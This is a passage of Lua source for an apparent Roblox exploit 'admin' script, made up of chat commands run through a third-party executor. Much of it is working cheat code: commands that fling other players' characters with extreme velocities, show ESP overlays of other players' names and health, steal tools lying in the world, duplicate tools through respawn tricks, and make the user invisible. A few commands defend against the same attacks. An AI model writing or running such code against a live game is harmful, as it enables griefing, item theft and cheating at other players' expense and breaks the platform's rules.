										plr.Character:SetPrimaryPartCFrame(Root2.CFrame * CFrame.new(0, 0, -10))
									else
										Hrp.CFrame = Root2.CFrame
										plr.Character:SetPrimaryPartCFrame(Root2.CFrame)
									end
								end)
								
								Hrp.Velocity = Vector3.new(9e9, 9e9, -9e9)
								Hrp.RotVelocity = Vector3.new(9e9, 9e9, -9e9)
							end)
						end)
	
						wait(Delay)
						Disconnect(GSignals['Fling'])
						for i = 1, 10 do
							pcall(function()
								GetCharacter(plr):SetPrimaryPartCFrame(LastPos); ResV()
							end)
						end
					end)
				end
			end
		end
	elseif GetPlayer(Args[1]) or Notify(format('Could not find Player %s', Args[1])) then
		local Player = GetPlayer(Args[1])
		
		while _G.IvAdminLoopFling do
			pcall(function()
				local Chr = GetCharacter(Player, 'HumanoidRootPart')
				local Hrp = GetCharacter(plr, 'HumanoidRootPart')
				local LastPos = Hrp.CFrame
				local Delay = Args[2] or 1/3

				GSignals['Fling'] = Heartbeat:Connect(function()
					pcall(function()
						GetCharacter(plr):SetPrimaryPartCFrame(Chr.CFrame)
						Hrp.CFrame = Chr.CFrame

						pcall(function()
							local Humanoid2 = Player.Character.Humanoid
							local Root2 = Player.Character.HumanoidRootPart
							if Humanoid2.MoveDirection ~= Vector3.new() then
								Hrp.CFrame = Root2.CFrame
								plr.Character:SetPrimaryPartCFrame(Root2.CFrame * CFrame.new(0, 0, -10))
							else
								Hrp.CFrame = Root2.CFrame
								plr.Character:SetPrimaryPartCFrame(Root2.CFrame)
							end
						end)

						Hrp.Velocity = Vector3.new(9e9, 9e9, -9e9)
						Hrp.RotVelocity = Vector3.new(9e9, 9e9, -9e9)
					end)
				end)

				wait(Delay)
				Disconnect(GSignals['Fling'])
				for i = 1, 10 do
					pcall(function()
						GetCharacter(plr):SetPrimaryPartCFrame(LastPos); ResV()
					end)
				end
			end)
		end
	end
end)

AddCommand('unloopfling', {'unlfling'}, 'Stop flinging', function()
	_G.IvAdminLoopFling = false
end)

AddCommand('stopanim', {'noanim'}, 'Temp Disable Animations', function()
	StopAnim('all')
end)

AddCommand('antibang', {'deathcf', 'voidcf'}, 'Anti-Bang', function()
    local Root = GetCharacter(plr, 'HumanoidRootPart')

    if Root then
        local lp = Root.CFrame
        local voidcf = CFrame.new(0, -498.5, 0)

        Root.CFrame = voidcf; wait(0.3)
        Root.CFrame = lp
    end
end)

AddCommand('hatfling', {'hfling'}, 'Hat Fling', function()
	Notify('Hat Fling Activated!', 5)
	local p = (plr.Character:FindFirstChild('HumanoidRootPart') or plr.Character:FindFirstChildWhichIsA('BasePart'))
	local inf, Run = Vector3.new(huge, huge, huge)
	local Character = plr.Character
	local fp = (p and p.CFrame)
	local Running = false
	local bm = {}
	local Run
	
	for _, v in next, plr.Character:GetChildren() do
		if (v:IsA('Accessory') or v:IsA('Hat')) and v:FindFirstChild('Handle') then
	        if v.Handle:FindFirstChildOfClass('SpecialMesh') then
	            v.Handle:FindFirstChildOfClass('SpecialMesh'):Destroy()
	        end
	
			local BodyPosition = Instance.new('BodyPosition', v.Handle)
	
			BodyPosition.D = 250
			BodyPosition.MaxForce = inf
			BodyPosition.Position = fp.p
			insert(bm, {
				[1] = BodyPosition,
				[2] = v.Handle
			})
		end
	end

	spawn(function()
		for i = 1, #plr.Character.Humanoid:GetChildren('NumberValue') do
			pcall(function()
				for _, v in next, plr.Character:GetChildren() do
					if v:IsA('Accessory') and v.Handle:FindFirstChild('AvatarPartScaleType') then
						v.Handle:WaitForChild('OriginalSize'):Destroy()
					end
				end
				plr.Character.Humanoid:FindFirstChildWhichIsA('NumberValue'):Destroy()
			end)
		end
	end)

	for _, v in next, plr.Character:GetChildren() do
		if v:IsA('BasePart') then
		v.Anchored = true
		end
	end
			
	plr.Character = nil
	plr.Character = Character
	wait(game.Players.RespawnTime + rad(tick())/1e8)
	
	for _, v in next, plr.Character:GetChildren() do
	    if v:IsA('BasePart') and v.Name ~= 'Head' then
	        v:Destroy()
	    end
	end
	plr.Character.Head:Destroy()
	
	Run = game:GetService('RunService').Heartbeat:Connect(function()
		if not plr.Character:FindFirstChild('Head') then
	        if Running then
	            return
	        end
	
	        Running = true
	        for _, v in next, game.Players:GetPlayers() do
	        	if v ~= plr and v.Character then
	        		for _2, v2 in next, bm do
						if v2[2] then
							pcall(function()
	                            v2[2].CanCollide = false
	                            v2[2].RotVelocity = Vector3.new(10 ^ 4, 10 ^ 4, 10 ^ 4)
	                            v2[1].Position = v.Character:FindFirstChildWhichIsA('BasePart').Position
	                        end)
	                    end
					end
	                
	                wait(1/3)
				end
			end
	        Running = false
	    else
			Notify('Hat Fling, Deactivated!')
	        Run:Disconnect()
	    end
	end)
end)

AddCommand('checktools', {'ctools'}, 'Tool Check User', function(Args)
	if Args[1] == 'all' or Args[1] == 'others' then
		for _, v in next, plrs:GetPlayers() do
			local Tools = maxn(v.Backpack:GetChildren())

			if v.Character then
				for _, v2 in next, v.Character:GetChildren() do
					if v:IsA('Tool') then
						Tools = Tools + 1
					end
				end
			end
			Notify(format('%s has %d tools!', v.DisplayName, Tools), pfp(v.UserId), 4); wait(1/4)
		end
	elseif GetPlayer(Args[1]) or Notify(format('Could not find player \'%s\'', Args[1])) then
		local Target = GetPlayer(Args[1])
		local Tools = maxn(Target.Backpack:GetChildren())
		if Target.Character then
			for _, v in next, Target.Character:GetChildren() do
				if v:IsA('Tool') then
					Tools = Tools + 1
				end
			end
		end
		Notify(format('%s has %d tools!', Target.DisplayName, Tools), pfp(Target.UserId), 4)
	end
end)

AddCommand('mass', {'masscheck', 'cmass'}, 'Mass Check User', function(Args)
	if Args[1] == 'all' or Args[1] == 'others' then
		for _, v in next, plrs:GetPlayers() do
			local Mass = 0

			for _, v2 in next, v.Character:GetChildren() do
				if v:IsA('BasePart') then
					Mass = Mass + v:GetMass()
				end
			end
			Notify(format('%s\'s mass: %d', v.DisplayName, Mass), pfp(v.UserId), 4); wait(1/4)
		end
	elseif GetPlayer(Args[1]) or Notify(format('Could not find player \'%s\'', Args[1])) then
		local Target = GetPlayer(Args[1])
		local Mass = 0

		for _, v in next, Target.Character:GetChildren() do
			if v:IsA('BasePart') then
				Mass = Mass + v:GetMass()
			end
		end
		Notify(format('%s\'s mass: %d', Target.DisplayName, Mass), pfp(Target.UserId), 4)
	end
end)

AddCommand('antiff', {'noff', 'aff'}, 'Disables ForceField', function()
	if isType(RemoveForceField, 'userdata') then
		RemoveForceField:Disconnect()
	end

	getgenv().RemoveForceField = Heartbeat:Connect(function()
		pcall(function()
			plr.Character.ForceField:Destroy()
		end)
	end)
end)

AddCommand('unantiff' ,{'unaff'}, 'Enables ForceField', function()
	if isType(RemoveForceField, 'userdata') then
		RemoveForceField:Disconnect()
	end
end)

AddCommand('loopwalkspeed', {'loopws', 'lws'}, 'Loop WalkSpeed', function(Args)
	if Args[1] then
		local Speed = Args[1]
		if _G.IvAdminLWS then
			for _, v in next, _G.IvAdminLWS do
				v:Disconnect()
			end
		end

		_G.IvAdminLWS = {}
		_G.IvAdminLWS['CharacterAdded'] = plr.CharacterAdded:Connect(function(Chr)
			_G.IvAdminLWS['NewHumanoid'] = Chr:WaitForChild('Humanoid').Changed:Connect(function(v)
				if v == 'WalkSpeed' then
					Chr.Humanoid.WalkSpeed = Speed
				end
			end)
			Chr.Humanoid.WalkSpeed = Speed
		end)

		_G.IvAdminLWS['OldHumanoid'] = plr.Character.Humanoid.Changed:Connect(function(v)
			if v == 'WalkSpeed' then
				plr.Character.Humanoid.WalkSpeed = Speed
			end
		end)
		plr.Character.Humanoid.WalkSpeed = Speed
		Notify('Loop WalkSpeed: Enabled')
	end
end)

AddCommand('unloopwalkspeed', {'unlws', 'unloopws'}, 'Stop loop walkspeed', function(Args)
	if _G.IvAdminLWS then
		for _, v in next, _G.IvAdminLWS do
			v:Disconnect()
		end
		_G.IvAdminLWS = nil
		Notify('Loop WalkSpeed: Disabled')
	end
end)

AddCommand('walkspeed', {'speed', 'ws'}, 'Player Walkspeed', function(Args)
	plr.Character.Humanoid.WalkSpeed = toNum(Args[1])
end)

AddCommand('hipheight', {'hh', 'hheight'}, 'Player HipHeight', function(Args)
	plr.Character.Humanoid.HipHeight = toNum(Args[1])
end)

AddCommand('time', {}, 'Clock Time', function(Args)
	local Times = {
        ['day'] = 12,
        ['night'] = 20,
        ['evening'] = 18,
        ['dark'] = 0
    }

	game:GetService('Lighting').TimeOfDay = Times[Args[1]] or toNum(Args[1]) or game:GetService('Lighting').TimeOfDay
end)

AddCommand('jumppower', {'jp'}, 'Jump Power', function(Args)
	plr.Character.Humanoid.JumpPower = toNum(Args[1])
end)

AddCommand('loopjumppower', {'loopjp', 'ljp'}, 'Loop JumpPower', function(Args)
	if Args[1] then
		local Power = Args[1]
		if _G.IvAdminLJP then
			for _, v in next, _G.IvAdminLJP do
				v:Disconnect()
			end
		end

		_G.IvAdminLJP = {}
		_G.IvAdminLJP['CharacterAdded'] = plr.CharacterAdded:Connect(function(Chr)
			_G.IvAdminLJP['NewHumanoid'] = Chr:WaitForChild('Humanoid').Changed:Connect(function(v)
				if v == 'JumpPower' then
					Chr.Humanoid.JumpPower = Power
				end
			end)
			Chr.Humanoid.JumpPower = Power
		end)

		_G.IvAdminLJP['OldHumanoid'] = plr.Character.Humanoid.Changed:Connect(function(v)
			if v == 'JumpPower' then
				plr.Character.Humanoid.JumpPower = Power
			end
		end)

		plr.Character.Humanoid.JumpPower = Power
		Notify('Loop JumpPower: Enabled')
	end
end)

AddCommand('unloopJumpPower', {'unljp', 'unloopjp'}, 'Stop loop JumpPower', function(Args)
	if _G.IvAdminLJP then
		for _, v in next, _G.IvAdminLJP do
			v:Disconnect()
		end
		_G.IvAdminLJP = nil
		Notify('Loop JumpPower: Disabled')
	end
end)

AddCommand('anchor', {}, 'Anchor HRP', function()
	for _, v in next, plr.Character:GetChildren() do
		if v:IsA('BasePart') then
			v.Anchored = true
		end
	end
end)

AddCommand('unanchor', {}, 'Unanchor', function()
	if plr.Character then
		for _, v in next, plr.Character:GetChildren() do
			if v:IsA('BasePart') then
				v.Anchored = false
			end
		end
	end
end)

AddCommand('noesp', {'unesp'}, 'Disable ESP', function()
	_G.IvESP = false
end)
	
AddCommand('esp', {}, 'Player Name ESP', function()
	_G.IvESP = false; wait(1/3)
	_G.IvESP = true

	local Connections = {}
	local Overhead = function(Player)
		local Chr = Player.Character or Player.CharacterAdded:Wait()
		local BBU = game:GetObjects('rbxassetid://10116879170')[1]

		BBU.Name = 'Iv ESP'
		BBU.Parent = Chr:WaitForChild('Head')
		BBU.Adornee = Chr.Head
		BBU.TextLabel.Text = format('%s<font color = \'rgb(0, 255, 0)\'> | %d </font>', Player.Name, Chr:WaitForChild('Humanoid').Health)

		Connections[#Connections + 1] = Player.CharacterAdded:Connect(function(Character)
			local BBU = game:GetObjects('rbxassetid://10116879170')[1]
			local Connections = {}
		
			BBU.Name = 'Iv ESP'
			BBU.Parent = Character:WaitForChild('Head')
			BBU.Adornee = Character.Head
			BBU.TextLabel.Text = format('%s<font color = \'rgb(0, 255, 0)\'> | %d </font>', Player.Name, Chr:WaitForChild('Humanoid').Health)
						
			Connections[#Connections + 1] = Character.Humanoid.HealthChanged:Connect(function()
				if Character.Humanoid.Health > 75 then
					BBU.TextLabel.Text = format('%s<font color = \'rgb(0, 255, 0)\'> | %d </font>', Player.Name, floor(Character.Humanoid.Health))
				elseif Character.Humanoid.Health > 25 then
					BBU.TextLabel.Text = format('%s<font color = \'rgb(255, 175, 0)\'> | %d </font>', Player.Name, floor(Character.Humanoid.Health))
				elseif Character.Humanoid.Health <= 25 then 
					BBU.TextLabel.Text = format('%s<font color = \'rgb(255, 0, 0)\'> | %d </font>', Player.Name, floor(Character.Humanoid.Health))	
				end
			end)
		end)
				
		Connections[#Connections + 1] = Chr.Humanoid.HealthChanged:Connect(function()
			if Chr.Humanoid.Health > 75 then
				BBU.TextLabel.Text = format('%s<font color = \'rgb(0, 255, 0)\'> | %d </font>', Player.Name, floor(Chr.Humanoid.Health))
			elseif Chr.Humanoid.Health > 25 then
				BBU.TextLabel.Text = format('%s<font color = \'rgb(255, 175, 0)\'> | %d </font>', Player.Name, floor(Chr.Humanoid.Health))
			elseif Chr.Humanoid.Health <= 25 then 
				BBU.TextLabel.Text = format('%s<font color = \'rgb(255, 0, 0)\'> | %d </font>', Player.Name, floor(Chr.Humanoid.Health))	
			end
		end)
	end

	for _, v in next, plrs:GetPlayers() do
		if v ~= plr then
			Overhead(v)
		end
	end

	Connections[#Connections + 1] = plrs.PlayerAdded:Connect(function(Player)
		Overhead(Player)
	end)

	while wait() do
		if not _G.IvESP then
			for _, v in next, Connections do
				v:Disconnect()
			end
			for _, v in next, workspace:GetDescendants() do
				if v:IsA('BillboardGui') and v.Name == 'Iv ESP' then
					v:Destroy()
				end
			end
			break
		end
	end
end)
	
AddCommand('respawn', {}, 'Default Respawn', function()
	if plr.Character then
		plr.Character:BreakJoints()
	end
end)

AddCommand('tdelete', {'tooldelete'}, 'Delete tool you hate', function(Args)
    if Args[1] == 'all' then
        plr.Character.Humanoid:UnequipTools()

        Wait(0.2)
        
        for _, v in next, plr.Backpack:GetChildren() do
            if v:IsA('Tool') then
                v:Remove()
            end
        end
        else
        if not plr.Character:FindFirstChildWhichIsA('Tool') then
            Notify('Must have unwanted tool equipped to delete!')
        else
        for _, v in next, plr.Character:GetChildren() do
            if v:IsA('Tool') then
                    v:Remove()
                end
            end
        end
    end
end)

AddCommand('reset', {'refresh', 're'}, 'Resets/Respawn', function()
	spawn(function()
		pcall(function()
			Notify('Reseting', 2)
			local Char, LP = plr.Character, (plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('HumanoidRootPart').CFrame) or plr.Character:GetModelCFrame()
			plr.Character = nil
			plr.Character = Char
			wait(RespawnTime - 1/8)
			LP = (Char:FindFirstChild('HumanoidRootPart') or Char:FindFirstChild('Head')).CFrame
			plr.Character.Humanoid:Destroy()
			plr.Character = nil
			plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LP
		end)
	end)
end)

AddCommand('goto', {'to'}, 'Teleport to User', function(Args)
	local Player = GetPlayer(Args[1])

	if Player then
		for i = 1, 10 do
			pcall(function()
				plr.Character.HumanoidRootPart.CFrame = Player.Character.Head.CFrame * CFrame.new(0, 1, 0); ResV(plr.Character)
			end)
		end
	end
end)

AddCommand('loopgoto', {'lgoto'}, 'Loop Teleport to User', function(Args)
	local Player = GetPlayer(Args[1])

	if _G.IvAdminLoopGoto then
		_G.IvAdminLoopGoto = false; wait(1/10)
	end

	if Player then
		while _G.IvAdminLoopGoto and wait() do
			pcall(function()
				plr.Character.HumanoidRootPart.CFrame = Player.Character.Head.CFrame * CFrame.new(0, 1, 0); ResV(plr.Character)
			end)
		end
	end
end)

AddCommand('unloopgoto', {'unlgoto'}, 'Stops loop Teleport', function()
	if _G.IvAdminLoopGoto then
		_G.IvAdminLoopGoto = false; wait(1/10)
	end
end)

AddCommand('nohat', {'rhats', 'removeaccessories'}, 'Remove Accessories', function()
    for _,v in next, plr.Character:GetChildren() do
    	if v:IsA('Hat') or v:IsA('Accessory') then
    		v:ClearAllChildren()
    	end
    end
end)

AddCommand('view', {'look','spectate'}, 'View User', function(Args)
	local Target = GetPlayer(Args[1])
		
	if Target then
		workspace.CurrentCamera.CameraSubject = Target.Character.Humanoid
		Notify(format('Viewing %s', Target.DisplayName), pfp(Target.UserId), 3)
	end
end)

AddCommand('loopview', {'autoview', 'autospectate'}, 'Constant View User', function(Args)
	local Target = GetPlayer(Args[1])
	_G.AutoSpectate = {
			Target = nil,
			Loop = false,
	}

	if Target then
		_G.AutoSpectate.Target = Target
		_G.AutoSpectate.Loop = true
		
		Notify(format('Viewing %s', Target.DisplayName), pfp(Target.UserId), 3)
		while _G.AutoSpectate.Loop and wait() do
			if not _G.AutoSpectate.Target then
				_G.AutoSpectate.Loop = false
				return
			end

			pcall(function()
				workspace.CurrentCamera.CameraSubject = _G.AutoSpectate.Target.Character.Humanoid
			end)
		end
	end
end)

AddCommand('unview', {'unlook','unspectate'}, 'Unview User', function()
	if _G.AutoSpectate then
		_G.AutoSpectate.Target = nil
		_G.AutoSpectate.Loop = false
	end
		
    workspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
end)

AddCommand('gettools', {'gtools', 'grabtools'}, 'Grabs workspace Tools', function()
	local Amount = 0
	for _, v in next, workspace:GetDescendants() do
		if v:IsA('Tool') and v:FindFirstChild('Handle') then
			spawn(function()
				pcall(function()
					pcall(function()
						v.Handle.Anchored = false
						v.Handle.CanCollide = false
						v.Handle.CFrame = GetCharacter(plr, 'HumanoidRootPart').CFrame
					end)
					firetouchinterest(v.Handle, GetCharacter(plr, 'HumanoidRootPart'), 0)
				end)

				v.Changed:Wait()
				if v.Parent == GetCharacter(plr) or v.Parent == plr.Backpack then
					Amount = Amount + 1
				end
			end)
		end
	end

	wait(0.5)
	Notify(Amount > 0 and format('Successfully grabbed %d Tool(s)', Amount) or 'Could not find any tools!')
end)

AddCommand('fat', {'fatte'}, 'Fat', function()
	if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 or Notify('Invalid RigType %d', plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15) then
		for _,v in next, plr.Character.Humanoid:GetChildren() do
			if v:IsA('NumberValue') then
		    	v:Remove()
			end
		end
	end
end)

AddCommand('stealtools', {'loopgrabtools', 'loopgtools'}, 'Constant Grab Tools', function()
	_G.StealingTools = false; wait(0.1); _G.StealingTools = true
	Notify('Grabbing Tools: Enabled')
	while _G.StealingTools and wait() do
		if workspace:FindFirstChildOfClass('Tool') then
			for _, v in next, workspace:GetChildren() do
				if v:IsA('Tool') then
					firetouchinterest(v.Handle, plr.Character.HumanoidRootPart, 0)
					pcall(function()
						v.Handle.CanCollide = false
						v.Handle.Anchored = false
						v.CFrame = plr.Character.HumanoidRootPart.CFrame
					end)
				end
			end
		end
	end
end)

AddCommand('unstealtools', {'unloopgrabtools', 'unloopgtools'}, 'Disables Constant Grabbing', function()
	Notify('Grabbing Tools: Disabled')
	_G.StealingTools = false
end)

AddCommand('antifling', {'afling'}, 'Antifling v1', function()
	_G.AntiFling = false;
	
	if not _G.AntiFling or Notify('Antifling already Enabled!') then
		_G.AntiFling = true;
		Notify('Antifling Enabled!');
		RenderStepped:Connect(function()
			for _, v in pairs(plrs:GetPlayers()) do
				if v.Name ~= plr.Name then
					if v.Character and v.Character:FindFirstChild('HumanoidRootPart') then
						spawn(function()
							if v.Character then
								for _, v2 in next, v.Character:GetChildren() do
									if (v2:IsA('Tool') or v2:IsA('Hat') or v2:IsA('Accessory')) and v2:FindFirstChild('Handle') then
										v2.Handle.CanCollide = false, wait()
									end
								end
							end
						end)

						if v.Character:FindFirstChild('Humanoid') and v.Character:FindFirstChild('Humanoid').Health >= 0 then
							local Root = v.Character.HumanoidRootPart
							if (Root.Velocity.X >= 25 or Root.Velocity.X <= -1) or (Root.Velocity.Y >= 16 or Root.Velocity.Y <= -1) or (Root.Velocity.Z >= 25 or Root.Velocity.Z <= -1) then
								Root.Velocity = Vector3.new(7, 0, 0)
								Root.RotVelocity = Vector3.new(0, 0, 0)
							elseif (Root.RotVelocity.X > 40 or Root.RotVelocity.X <= -1) or (Root.RotVelocity.Y > 10 or Root.RotVelocity.Y <= -1) or Root.RotVelocity.Z > 40 then
								Root.Velocity = Vector3.new(7, 0, 0)
								Root.RotVelocity = Vector3.new(0, 0, 0)
							end
						end
					end
					if v.Character and v.Character:FindFirstChild('Head') then
						if v.Character:FindFirstChild('Humanoid') and v.Character:FindFirstChild('Humanoid').Health >= 0 then
							local Root = v.Character.Head
							if (Root.Velocity.X >= 25 or Root.Velocity.X <= -1) or (Root.Velocity.Y >= 16 or Root.Velocity.Y <= -1) or (Root.Velocity.Z >= 25 or Root.Velocity.Z <= -1) then
								Root.Velocity = Vector3.new(7, 0, 0)
								Root.RotVelocity = Vector3.new(0, 0, 0)
							elseif (Root.RotVelocity.X > 40 or Root.RotVelocity.X <= -1) or (Root.RotVelocity.Y > 10 or Root.RotVelocity.Y <= -1) or Root.RotVelocity.Z > 40 then
								Root.Velocity = Vector3.new(7, 0, 0)
								Root.RotVelocity = Vector3.new(0, 0, 0)
							end
						end
					end
				end
			end
		end)
	end
end)

AddCommand('antikill', {'akill'}, 'Anti Kill', function()
	pcall(function()
		plr.Character.Humanoid:SetStateEnabled('Seated', false)
		plr.Character.Humanoid.Sit = true
		Notify('Anti-Kill')
	end)
end)

AddCommand('bbhang', {'bhang', 'boomboxhang'}, 'BoomBox Hanger', function(Args)
	plr.Character.Humanoid:UnequipTools()
	local Tools = plr.Backpack:GetChildren()
	
	if maxn(Tools) > 0 then
		if Args[1] == 'all' or Args[1] == 'others' then
			for _, v in next, plr.Backpack:GetChildren() do
				if v:FindFirstChild('Remote') then
					v.Grip = CFrame.new(0, 0.7, 0) * CFrame.Angles(rad(90), rad(180), rad(90))
					v.Parent = plr.Character
				end
			end
		else
			Tools[1] = plr.Backpack.BoomBox
			Tools[1].Grip = CFrame.new(0, 0.7, 0) * CFrame.Angles(rad(90), rad(180), rad(90))
			Tools[1].Parent = plr.Character
		end
	
		wait(0.3)
		StopAnim('ToolNoneAnim')
	end
end)

AddCommand('droptool', {'dtool'}, 'Drops current tool', function()
	local Tool = plr.Character:FindFirstChildOfClass('Tool') or plr.Backpack:FindFirstChildOfClass('Tool')
	
	if Tool then
		Tool.Parent = plr.Character
        Tool.Parent = workspace
	end
end)

AddCommand('droptools', {'dtools'}, 'Drops tools', function()
	plr.Character.Humanoid:UnequipTools()
	local Tools = plr.Backpack:GetChildren()

	for _, v in next, Tools do
		v.Parent = plr.Character
		v.Parent = workspace
	end
end)

AddCommand('dupetools', {'dupe'}, 'Dupe <int>', function(Args)
	if not toNum(Args[1]) then
		return
	end

	Notify('Duping Tools: ' ..Args[1])
    for i = 1, toNum(Args[1]) do
    	pcall(function()
			local DupedTools = {}
    	    local Char, LP, Tools = plr.Character, plr.Character.HumanoidRootPart.CFrame
    	    plr.Character = nil
    	    plr.Character = Char
			wait(RespawnTime - 1/5)

			LP = (Char:FindFirstChild('HumanoidRootPart') or Char:FindFirstChild('Head')).CFrame
			plr.Character:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame * CFrame.new(0, 1e4, 0))
			plr.Character.Humanoid:UnequipTools()
			Tools = plr.Backpack:GetChildren()

			wait(1/10)
			for _, v in next, Tools do
				v.Parent = plr.Character
				v.Parent = workspace
				insert(DupedTools, v)
			end
					
    	    plr.Character.Humanoid:Destroy()
    	    plr.Character = nil
    	    plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LP
			plr.Character:WaitForChild('Humanoid')

			for _, v in next, DupedTools do
				pcall(function()
					plr.Character.Humanoid:EquipTool(v)
				end)
			end
    	end)
    end
end)

AddCommand('bighat', {'gianthat'}, 'Giant Hat', function()
	local HasRthroAccessory = false

	if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
		return Notify('R15 required!')
	end

	wait(1/5)
	for _, v in next, plr.Character:GetChildren() do
		if v:IsA('Accessory') and not v.Handle:FindFirstChildWhichIsA('Configuration') then
			HasRthroAccessory = true; break
		end
	end

	if HasRthroAccessory or Notify('Could not find Rthro Accessories!') then
		for i = 1, maxn(plr.Character.Humanoid:GetChildren('NumberValue')) do
			pcall(function()
				for _, v in next, plr.Character:GetChildren() do
					if v:IsA('Accessory') and v.Handle:FindFirstChild('Configuration') then
						v.Handle:WaitForChild('OriginalSize'):Destroy()
					end
				end
				plr.Character.Humanoid:FindFirstChildWhichIsA('NumberValue'):Destroy()
			end)
		end	
	end
end)

AddCommand('ping', {}, 'Ping', function()
	local Stat = game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValueString(game:GetService('Stats').Network.ServerStatsItem['Data Ping'])
	Notify(format('Ping: %s ms', Stat:split(' ')[1]))
end)

AddCommand('fps', {}, 'FPS', function()
	local Counter, Data = 1
	Data = RenderStepped:Connect(function()
		Counter = Counter + 1
		task.wait()
	end)
	
	wait(1)
	Data:Disconnect()
	Notify('FPS: '..Counter)
end)

AddCommand('equiptools', {'alltools', 'etools'}, 'Equip all tools', function()
	for _, v in next, plr.Backpack:GetChildren() do
		v.Parent = plr.Character
	end
end)

AddCommand('invisible', {'invis'}, 'Turn invisible', function()
	if plr.Character.Name == 'Iv Admin Invis Character' then
		return Notify('Character already invisible!')
	end

	plr.Character.Archivable = true
	plr.Character.Humanoid.Torso.Anchored = true
	local FakeChar = plr.Character:Clone()
	FakeChar.Parent = plr.Character
	FakeChar.Name = 'Iv Admin Invis Character'

	for _, v in next, FakeChar:GetDescendants() do
		if v:IsA('BasePart') then
			v.Anchored = false
			v.Material = Enum.Material.ForceField
		end
	end

	plr.Character = FakeChar
	workspace.CurrentCamera.CameraSubject = FakeChar.Humanoid
	Notify('Player is now invisible')
end)

AddCommand('visible', {'vis'}, 'Become visible', function()
	if plr.Character:FindFirstChild('Iv Admin Invis Character') then
		plr.Character['Iv Admin Invis Character']:Destroy()
	elseif plr.Character.Name == 'Iv Admin Invis Character' then
		local CurrentPos = plr.Character.HumanoidRootPart.CFrame
		plr.Character = plr.Character.Parent
		plr.Character['Iv Admin Invis Character']:Destroy()
		plr.Character.Humanoid.Torso.Anchored = false
		workspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
		plr.Character:SetPrimaryPartCFrame(CurrentPos)
		Notify('Invisibility is now disabled!')
	end
end)

AddCommand('bighead', {'gianthead'}, 'Giant Head', function()
	if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
		return Notify('Player needs to be R15!')
	end

	Notify('Checking for Rthro Head!')
	wait(1/5)
	if plr.Character.Head:FindFirstChild('AvatarPartScaleType') then
		Notify('Found Rthro Head!')
		for i = 1, #plr.Character.Humanoid:GetChildren('NumberValue') do
			plr.Character.Head:WaitForChild('OriginalSize'):Destroy()
			if plr.Character.Humanoid:FindFirstChildWhichIsA('NumberValue') then
				plr.Character.Humanoid:FindFirstChildWhichIsA('NumberValue'):Destroy()
			end
		end
	else
		return Notify('Could not find Rthro Head!')
	end
end)

AddCommand('pmute', {'playermute'}, 'Player Mute', function(Args)
	if Args[1] == 'all' or Args[1] == 'others' then
		return Notify('Action not supported!')
	end

	if GetPlayer(Args[1]) and GetPlayer(Args[1]) ~= plr or Notify(format('Player not found! \'%s\'', Args[1])) then
		local Player = GetPlayer(Args[1])

		Disconnect(GSignals[Player.UserId])
		Disconnect(GSignals[format('%d_%s', Player.UserId, Player.Name)])
		Notify(format('Muted %s', Player.DisplayName), pfp(Player.UserId), 4)

		GSignals[Player.UserId] = RenderStepped:Connect(function()
			for _, v in next, Player.Backpack:GetDescendants() do
				if v:IsA('Sound') then
					v.TimePosition = 0
					v:Stop()
				end
			end
		end)

		GSignals[format('%d_%s', Player.UserId, Player.Name)] = RenderStepped:Connect(function()
			if Player.Character then
				for _, v in next, Player.Character:GetDescendants() do
					if v:IsA('Sound') and v.Playing then
						v.TimePosition = 0
						v:Stop()
					end
				end
			end
		end)
	end
end)

AddCommand('unpmute', {'unplayermute'}, 'Unplayer Mute', function(Args)
	if Args[1] == 'all' or Args[1] == 'others' then
		return Notify('Action not supported!')
	end

	if GetPlayer(Args[1]) and GetPlayer(Args[1]) ~= plr or Notify(format('Player not found! \'%s\'', Args[1])) then
		local Player = GetPlayer(Args[1])

		Disconnect(GSignals[Player.UserId])
		Disconnect(GSignals[format('%d_%s', Player.UserId, Player.Name)])
		Notify(format('Unmuted %s', Player.DisplayName), pfp(Player.UserId), 4)
	end
end)

AddCommand('unsync', {}, 'Unsync player\'s Sound Player', function(Args)
	if not Args[1] or Args[1] == 'all' or Args[1] == 'others' then
		for _, v in next, game:GetDescendants() do
			if v:IsA('Sound') and v.Playing then
				v.TimePosition = random(0, floor(v.TimeLength))
			end
		end
		return Notify('Unsync all playing sounds!')
	end

	if GetPlayer(Args[1]) or Notify(format('Could not find player %s', Args[1])) then
		local Player = GetPlayer(Args[1])

		Notify(format('Unsync all playing sounds from %s', Player.DisplayName), pfp(Player.UserId), 3)
		for _, v in next, Player.Backpack:GetDescendants() do
			if v:IsA('Sound') and v.Playing then
				v.TimePosition = random(0, floor(v.TimeLength))
			end
		end

		for _, v in next, Player.Character:GetDescendants() do
			if v:IsA('Sound') and v.Playing then
				v.TimePosition = random(0, floor(v.TimeLength))
			end
		end
	end
end)

AddCommand('sync', {}, 'Sync player\'s Sound Player', function(Args)
	if not Args[1] or Args[1] == 'all' or Args[1] == 'others' then
		for _, v in next, game:GetDescendants() do
			if v:IsA('Sound') then
				v.Playing = true
				v.TimePosition = 0
			end
		end
		return Notify('Syncing all playing sounds!')
	end

	if GetPlayer(Args[1]) then
		local Player = GetPlayer(Args[1])
		local LastTimePos, Sounds = nil, {}

		Notify(format('Syncing all playing sounds from %s', Player.DisplayName), pfp(Player.UserId), 3)
		for _, v in next, Player.Backpack:GetDescendants() do
			if v:IsA('Sound') then
				LastTimePos = LastTimePos or v.Playing and v.TimePosition
				v.TimePosition = 0
				v.Playing = false
				insert(Sounds, v)
			end
		end

		for _, v in next, Player.Character:GetDescendants() do
			if v:IsA('Sound') then
				LastTimePos = LastTimePos or v.Playing and v.TimePosition
				v.TimePosition = 0
				v.Playing = false
				insert(Sounds, v)
			end
		end

		wait(0.1)

		for _, v in next, Sounds do
			spawn(function()
				v.TimePosition = LastTimePos
				v.Playing = true
			end)
		end
	end
end)

AddCommand('mute', {'mutesound'}, 'Mute User', function(Args)
	if Args[1] == 'all' or Args[1] == 'others' then
		for _, v in next, game:GetDescendants() do
